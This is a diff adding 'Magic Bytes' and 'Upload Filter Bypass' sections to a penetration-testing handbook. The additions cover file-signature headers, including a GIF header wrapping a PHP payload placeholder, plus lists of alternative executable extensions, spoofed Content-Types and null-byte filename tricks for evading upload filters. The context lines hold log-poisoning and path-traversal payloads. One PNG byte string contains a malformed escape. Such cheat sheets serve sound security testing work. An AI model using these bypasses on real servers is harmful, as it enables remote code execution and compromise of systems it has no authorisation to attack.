@@ -45,6 +45,7 @@
 - [Local File Inclusion (LFI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Local-File-Inclusion-LFI)
 - [Lodash](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Lodash)
 - [Log Poisoning](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Log-Poisoning)
+- [Magic Bytes](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Magic-Bytes)
 - [mitmproxy](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#mitmproxy)
 - [ngrok](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#ngrok)
 - [OpenSSL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#OpenSSL)
@@ -58,6 +59,7 @@
 - [Subdomain Takeover](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Subdomain-Takeover)
 - [Symfony](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Symfony)
 - [unfurl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#unfurl)
+- [Upload Filter Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Upload-Filter-Bypass)
 - [Upload Vulnerabilities](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Upload-Vulnerabilities)
 - [waybackurls](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#waybackurls)
 - [Web Log Poisoning](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Web-Log-Poisoning)
@@ -2879,6 +2881,50 @@ $ ssh "<?php phpinfo();?>"@<LHOST>
 $ http://<RHOST>/view.php?page=../../../../../var/log/auth.log
 ```
 
+## Magic Bytes
+
+### GIF
+
+```c
+GIF8;
+GIF87a
+```
+
+### JPG
+
+```c
+\xff\xd8\xff
+```
+
+### PDF
+
+```c
+%PDF-1.5
+%
+```
+
+```c
+%PDF-1.7
+%
+```
+
+### PNG
+
+```c
+\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
+```
+
+### Examples
+
+#### GIF Magic Bytes
+
+```c
+GIF89a;
+<?php
+  <PAYLOAD>
+?>
+```
+
 ## mitmproxy
 
 ```c
@@ -3551,6 +3597,78 @@ $ python3 secret_fragment_exploit.py 'http://<RHOST>/_fragment' --method 2 --sec
 
 ```c
 $ go install github.com/tomnomnom/unfurl@latest
+```
+
+## Upload Filter Bypass
+
+### Java Server Pages (JSP) Filter Bypass
+
+```c
+.MF
+.jspx
+.jspf
+.jsw
+.jsv
+.xml
+.war
+.jsp
+.aspx
+```
+
+### PHP Filter Bypass
+
+```c
+.sh
+.cgi
+.inc
+.txt
+.pht
+.phtml
+.phP
+.Php
+.php3
+.php4
+.php5
+.php7
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.jpeg
+```
+
+### Content-Types
+
+```c
+Content-Type : image/gif
+Content-Type : image/png
+Content-Type : image/jpeg
+```
+
+### Examples
+
+#### Null Bytes
+
+```c
+$ mv <FILE>.jpg <FILE>.php\x00.jpg
+```
+
+#### More Bypass Examples
+
+```c
+<FILE>.php%20
+<FILE>.php%0d%0a.jpg
+<FILE>.php%0a
+<FILE>.php.jpg
+<FILE>.php%00.gif
+<FILE>.php\x00.gif
+<FILE>.php%00.png
+<FILE>.php\x00.png
+<FILE>.php%00.jpg
+<FILE>.php\x00.jpg
 ```
 
 ## Upload Vulnerabilities
